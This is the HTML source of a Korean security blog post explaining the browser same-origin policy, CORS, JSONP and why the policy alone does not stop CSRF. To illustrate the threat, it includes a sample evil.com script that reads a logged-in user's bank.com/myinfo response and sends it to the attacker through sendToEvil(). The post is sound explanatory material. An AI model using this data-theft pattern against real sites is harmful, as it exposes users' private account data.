@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Same-origin policy는 인터넷 브라우저와 같이 http 서버와 통신하는 웹 애플리케이션이 사용하는 보안 정책의 한 종류이다. 현대의 브라우저라면 필수적으로 적용하는 정책으로, 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 컨텐츠를 읽을 때 Origin이 같은 경우만 허용하는 정책이다.
+The Origin 한국어로 기원, 근원을 의미하는 Origin이라는 단어는 Same-origin policy에서 정확히 어떤 의미를 사용되고, 왜 필요한건지 알 필요가 있다.
+기본적으로 HTTP 프로토콜로 통신하는 클라이언트와 서버는 매 연결마다 새로운 연결을 시도한다. 때문에 웹 사이트에 로그인한 유저의 상태를 계속 유지하는 것처럼, 이전 HTTP 요청에 대한 정보를 유지하고 싶으면 Cookie에 세션 아이디를 저장하는 방식을 사용할 수 있다.'>
+<title>Misunderstood of same-origin policy</title>
+
+<link rel='canonical' href='https://truealarm.github.io/p/misunderstood-of-same-origin-policy/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Misunderstood of same-origin policy'>
+<meta property='og:description' content='Same-origin policy는 인터넷 브라우저와 같이 http 서버와 통신하는 웹 애플리케이션이 사용하는 보안 정책의 한 종류이다. 현대의 브라우저라면 필수적으로 적용하는 정책으로, 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 컨텐츠를 읽을 때 Origin이 같은 경우만 허용하는 정책이다.
+The Origin 한국어로 기원, 근원을 의미하는 Origin이라는 단어는 Same-origin policy에서 정확히 어떤 의미를 사용되고, 왜 필요한건지 알 필요가 있다.
+기본적으로 HTTP 프로토콜로 통신하는 클라이언트와 서버는 매 연결마다 새로운 연결을 시도한다. 때문에 웹 사이트에 로그인한 유저의 상태를 계속 유지하는 것처럼, 이전 HTTP 요청에 대한 정보를 유지하고 싶으면 Cookie에 세션 아이디를 저장하는 방식을 사용할 수 있다.'>
+<meta property='og:url' content='https://truealarm.github.io/p/misunderstood-of-same-origin-policy/'>
+<meta property='og:site_name' content='True Alarm'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-12-21T02:05:26&#43;09:00'/><meta property='article:modified_time' content='2022-12-21T02:05:26&#43;09:00'/>
+<meta name="twitter:title" content="Misunderstood of same-origin policy">
+<meta name="twitter:description" content="Same-origin policy는 인터넷 브라우저와 같이 http 서버와 통신하는 웹 애플리케이션이 사용하는 보안 정책의 한 종류이다. 현대의 브라우저라면 필수적으로 적용하는 정책으로, 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 컨텐츠를 읽을 때 Origin이 같은 경우만 허용하는 정책이다.
+The Origin 한국어로 기원, 근원을 의미하는 Origin이라는 단어는 Same-origin policy에서 정확히 어떤 의미를 사용되고, 왜 필요한건지 알 필요가 있다.
+기본적으로 HTTP 프로토콜로 통신하는 클라이언트와 서버는 매 연결마다 새로운 연결을 시도한다. 때문에 웹 사이트에 로그인한 유저의 상태를 계속 유지하는 것처럼, 이전 HTTP 요청에 대한 정보를 유지하고 싶으면 Cookie에 세션 아이디를 저장하는 방식을 사용할 수 있다.">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/flappy1000_hu1c66c531ae5bca477a9190a15e605814_6192_300x0_resize_box_3.png" width="300"
+                            height="273" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">True Alarm</a></h1>
+            <h2 class="site-description">I&#39;m sorry but don&#39;t wanna code</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/truealarm'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/404'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#the-origin">The Origin</a></li>
+    <li><a href="#how-to-work">How to work</a></li>
+    <li><a href="#jsonp">JSONP</a></li>
+    <li><a href="#illusions">Illusions</a>
+      <ol>
+        <li><a href="#cant-we-set-the-origin-header">Can&rsquo;t we set the Origin header?</a></li>
+        <li><a href="#-note">📝 <strong>Note</strong></a></li>
+        <li><a href="#can-same-origin-policy-prevent-csrf">Can same-origin policy prevent CSRF?</a></li>
+        <li><a href="#can-custom-headers-prevent-csrf">Can custom headers prevent CSRF?</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/misunderstood-of-same-origin-policy/">Misunderstood of same-origin policy</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 21, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Same-origin policy는 인터넷 브라우저와 같이 http 서버와 통신하는 웹 애플리케이션이 사용하는 보안 정책의 한 종류이다. 현대의 브라우저라면 필수적으로 적용하는 정책으로, 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 컨텐츠를 읽을 때 Origin이 같은 경우만 허용하는 정책이다.</p>
+<h2 id="the-origin">The Origin</h2>
+<p>한국어로 기원, 근원을 의미하는 Origin이라는 단어는 Same-origin policy에서 정확히 어떤 의미를 사용되고, 왜 필요한건지 알 필요가 있다.</p>
+<p>기본적으로 HTTP 프로토콜로 통신하는 클라이언트와 서버는 매 연결마다 새로운 연결을 시도한다. 때문에 웹 사이트에 로그인한 유저의 상태를 계속 유지하는 것처럼, 이전 HTTP 요청에 대한 정보를 유지하고 싶으면 Cookie에 세션 아이디를 저장하는 방식을 사용할 수 있다.</p>
+<p>브라우저는 스크립트를 통해 시작된 HTTP 요청에도 Cookie를 리퀘스트 헤더에 포함하고, Cookie에는 세션 정보를 포함하고 있으므로, 서버는 로그인한 유저라고 간주한 채 요청을 처리하고 리스폰스를 반환한다. 이때 아무런 제약 없이 리스폰스를 읽을 수 있다면, 심각한 보안 위협으로 이어질 수 있다.</p>
+<p>악의적인 웹 사이트(evil.com)의 운영자가 선량한 웹 사이트의 민감 정보를 반환하는 API(bank.com/myinfo)를 요청하고, 이 결과를 다시 본인의 서버로 전송하는 스크립트(아래 코드 참고)를 웹 사이트에 포함시켜 놓으면, 선량한 웹 사이트에 로그인한 유저가 evil.com에 방문하는 것만으로도 민감 정보가 유출된다.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- evil.com --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">sendToEvil</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;bank.com/myinfo&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>이를 막기 위해 필요한 정보가 Origin이다. Origin은 브라우저가 스크립트를 통해 HTTP 요청을 시작할 때 해당 스크립트가 실행된 장소를 의미한다. 그리고 장소는 schema, hostname, port 정보를 합쳐 표현한다. (i.e., schema://hostname:port)</p>
+<p>예를 들어 <code>http://www.example.com:8080/hello</code> 에서 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API"  target="_blank" rel="noopener"
+    >fetch</a>로 <code>http://www.naver.com</code> 사이트를 읽어오면 Origin은 <code>http://www.example.com:8080</code> 가 되는 것이다. <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host"  target="_blank" rel="noopener"
+    >Host</a> 혹은 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer"  target="_blank" rel="noopener"
+    >Referer</a>와 비슷하지만 Host는 schema를 포함하지 않고, Referer는 path까지 포함하는 정보이다.</p>
+<h2 id="how-to-work">How to work</h2>
+<p>브라우저가 스크립트를 통해 HTTP 요청을 시작할 때 schema, host, port 정보로 Origin을 만들고, 이 정보를 HTTP 요청마다 Origin 헤더로 추가한다. 서버는 요청을 처리한 뒤, 리스폰스 헤더에 해당 Origin이 리스폰스를 읽을 수 있는지 여부를 표시한다. 이후 브라우저에서 리스폰스에 표시가 없다면 스크립트에서 접근을 제한한다.</p>
+<p>크롬이나 사파리 같은 메이저 브라우저에서 다른 Origin의 웹 사이트를 요청하는 코드를 실행해보면 에러가 반환되는 것을 확인할 수 있다. 서버에서 명시적으로 특정 Origin을 허용하도록 설정해주지 않으면, 리소스에 대한 접근이 불가능한 것이다.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;http://example.com&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Access to XMLHttpRequest at &#39;https://example.com/&#39; from origin &#39;https://stackoverflow.com&#39; has been blocked by CORS policy: No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// GET https://example.com/ net::ERR_FAILED 200
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="jsonp">JSONP</h2>
+<p>Same-origin policy는 스크립트를 통해 생성된 HTTP 요청에만 적용되고, 다른 도메인의 이미지, CSS나 스크립트 파일을 로드하면서 발생하는 HTTP 요청은 해당되지 않는다. 이런 특성은 강제적인 Same-origin policy의 제한을 예외적으로 허용하고 싶을 때, (i.e., 서로 다른 서브 도메인 간 리소스 공유) 활용될 수 있고, 이를 <a class="link" href="https://en.wikipedia.org/wiki/JSONP"  target="_blank" rel="noopener"
+    >JSONP</a> (JSON with Padding)라고 부른다.</p>
+<p>현재의 <a class="link" href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing"  target="_blank" rel="noopener"
+    >CORS</a> (Cross-Origin Resource Sharing)가 널리 사용되기 전인 2005년에 Bob Ippolito에 의해 고안된 방법으로, script의 src에 요청할 다른 도메인의 서버의 주소를 지정하고, 해당 서버에서는 JSON 형식의 리스폰스를 callback 함수의 인자로 호출하는 스크립트 소스 형태로 반환하는 것이다. (아래 코드 참고) 서로 다른 Origin 간 HTTP 요청이지만, 스크립트 로드를 통해 읽어온 데이터이므로 Same-origin policy에 위배되지 않고 Cross-Origin Resource Sharing이 가능하다.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;application/javascript&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://bank.com/myinfo?callback=checkAccount&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Response of http://example.com/myinfo
+</span></span><span class="line"><span class="cl">checkAccount({&#34;name&#34;: &#34;Alice&#34;, &#34;id&#34;: 1234});
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="illusions">Illusions</h2>
+<h3 id="cant-we-set-the-origin-header">Can&rsquo;t we set the Origin header?</h3>
+<p><a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin#description"  target="_blank" rel="noopener"
+    >모질라 문서</a>에 따르면 브라우저는 아래와 같은 요청에는 무조건 Origin 헤더를 추가한다. 그래서 Origin 헤더를 임의로 설정한 뒤 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest"  target="_blank" rel="noopener"
+    >XMLHttpRequest</a>를 실행해도 브라우저가 알아서 덮어씌우므로 변조할 수 없다.</p>
+<blockquote>
+<ul>
+<li><a class="link" href="https://developer.mozilla.org/en-US/docs/Glossary/CORS"  target="_blank" rel="noopener"
+    >cross origin</a> requests.</li>
+<li><a class="link" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy"  target="_blank" rel="noopener"
+    >same-origin</a> requests except for <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET"  target="_blank" rel="noopener"
+    ><code>GET</code></a> or <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD"  target="_blank" rel="noopener"
+    ><code>HEAD</code></a> requests (i.e. they are added to same-origin <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST"  target="_blank" rel="noopener"
+    ><code>POST</code></a>, <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS"  target="_blank" rel="noopener"
+    ><code>OPTIONS</code></a>, <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT"  target="_blank" rel="noopener"
+    ><code>PUT</code></a>, <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PATCH"  target="_blank" rel="noopener"
+    ><code>PATCH</code></a>, and <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/DELETE"  target="_blank" rel="noopener"
+    ><code>DELETE</code></a> requests).</li>
+</ul>
+</blockquote>
+<blockquote>
+<h3 id="-note">📝 <strong>Note</strong></h3>
+<p>Origin 헤더 말고 스크립트에서 덮어씌울 수 없는 헤더 목록은 <a class="link" href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name"  target="_blank" rel="noopener"
+    >Forbidden header name</a>에서 확인할 수 있다.</p>
+</blockquote>
+<p>Origin 헤더를 추가하는 정책은 <a class="link" href="https://www.rfc-editor.org/rfc/rfc6454#section-7.3"  target="_blank" rel="noopener"
+    >rfc 문서</a>의 &ldquo;7.3 User Agent Requirements&rdquo; 부분을 읽어보면 Same-origin policy를 위한 필수적인 요구 사항임을 알 수 있다.</p>
+<blockquote>
+<ul>
+<li>The user agent MAY include an Origin header field in any HTTP
+request.</li>
+<li>The user agent MUST NOT include more than one Origin header field in
+any HTTP request.</li>
+</ul>
+</blockquote>
+<p>물론 Burp Suite 같은 Web proxy를 통해 HTTP 요청을 intercept 한다면 Origin 헤더를 변조할 수 있다. 근데 이런 방식으로 HTTP 요청을 감청하여 Origin을 변경할 수 있는건 MITM이 가능하다는 전제이므로 고려하지 않는다. Same-origin policy는 악성 웹 사이트의 관리자가 스크립트 코드를 통해 다른 웹 사이트의 리소스를 읽을 수 없도록 막아준다. 애초에 MITM이 가능하다면 Origin을 변경하여 Same-origin policy가 우회되는 것은 신경쓰지 않아도 될 정도로 심각한 공격이 가능하다.</p>
+<h3 id="can-same-origin-policy-prevent-csrf">Can same-origin policy prevent CSRF?</h3>
+<p>Same-origin policy가 <a class="link" href="https://owasp.org/www-community/attacks/csrf"  target="_blank" rel="noopener"
+    >CSRF</a> 공격까지 막을 수 있을까? 라는 질문에 꽤 많은 사람들이 막을 수 있다고 생각한다. 결론부터 말하면 절반 정도 맞는 말이다. Same-origin policy이 다른 Origin에 대한 HTTP 요청을 막아준다고 착각해서 악의적인 웹 사이트에서 정상적인 웹 사이트로 변조된 요청을 보내는 CSRF 공격을 막을 수 있다고 믿는다.</p>
+<blockquote>
+<p>Same-origin policy는 웹 페이지에서 스크립트를 통해 다른 웹 페이지의 <strong>컨텐츠를 읽을 때</strong> Origin이 같은 경우만 허용하는 정책이다.</p>
+</blockquote>
+<p>해당 포스트의 첫 문단에서 설명한 대로 <strong>Same-origin policy는 HTTP 요청을 막는 게 아니라 요청 결과에 접근하지 못하도록 막는 것이다.</strong> 요청 자체를 막으려면 서버에서 Origin을 확인하고 요청을 거부하거나, 브라우저에서 실제 요청을 보내기 전에 서버에게 허용된 Origin이 맞는지 확인하는 과정이 필요하다.</p>
+<p>CSRF 공격을 막을 수 있다는 말이 절반정도 맞는 이유는 CSRF를 막기 위해 흔히 사용되는 <a class="link" href="https://portswigger.net/web-security/csrf/tokens"  target="_blank" rel="noopener"
+    >CSRF token</a> 같은 방어책이 Same-origin policy에 의존하기 때문이다. 서버에서 웹 페이지를 제공하기 전에 랜덤한 값(CSRK token)을 생성하여 유저의 세션에 저장하고, 웹 페이지에 존재하는 input form에 포함시킨 채로 제공한다. 그러면 요청이 전송될 때 토큰이 같이 전송되고 서버에서 세션에 저장된 토큰과 비교하여 위조된 요청인지 확인한다.</p>
+<p>만약 Same-origin policy가 보장되지 않는다면 공격자는 웹 페이지에 포함되어 있는 토큰 값을 읽을 수 있으니 CSRF 공격을 막을 수 없다.</p>
+<h3 id="can-custom-headers-prevent-csrf">Can custom headers prevent CSRF?</h3>
+<p>세션 아이디를 Cookie가 아닌 Custom header를 통해 전달하도록 서버를 구성하면 일부 CSRF 공격을 막을 수 있다. 이 방법은 CSRF token 같이 웹 페이지나 세션 정보에 토큰을 저장하지 않는 장점이 있다.</p>
+<p><a class="link" href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader"  target="_blank" rel="noopener"
+    >XMLHttpRequest.setRequestHeader</a> 공식 문서를 참고하면 다른 도메인에 대한 HTTP 요청에 Custom header를 추가하면 Same-origin policy에 의해 요청이 중단된다고 나와있다.</p>
+<blockquote>
+<p><strong>Note:</strong> For your custom fields, you may encounter a &ldquo;<strong>not allowed by Access-Control-Allow-Headers in preflight response</strong>&rdquo; exception when you send requests across domains. In this situation, you need to set up the <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers"  target="_blank" rel="noopener"
+    ><code>Access-Control-Allow-Headers</code></a> in your response header at server side.</p>
+</blockquote>
+<p>그래서 <code>setRequestHeader(&quot;x-custom-header&quot;, 'abc')</code>로 헤더를 추가하여 요청을 보내면 OPTIONS 메소드로 먼저 요청을 보내 허용된 Origin인지 확인하는 과정(pre-flight CORS check)이 추가된다. 하지만 XHR이나 AJAX를 사용하는 API 요청에만 적용할 수 있고, form 태그를 통한 요청에는 적용할 수 없다. 그리고 pre-flight CORS check를 위한 CORS 설정도 따로 관리해줘야 하므로 오히려 비용이 증가할 수 있다.</p>
